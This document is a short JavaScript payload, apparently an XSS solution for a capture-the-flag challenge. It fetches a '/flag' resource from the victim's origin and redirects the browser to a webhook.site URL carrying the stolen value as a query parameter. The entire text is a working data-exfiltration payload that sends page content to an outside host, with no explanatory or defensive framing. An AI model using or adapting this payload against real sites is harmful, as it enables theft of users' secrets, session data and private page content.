(async () => {
  const flag = await (await fetch('/flag')).text();
  location = "https://webhook.site/d6fcb08a-5fb3-4e51-b3c3-09e06007096c?flag=" + encodeURIComponent(flag);
})();
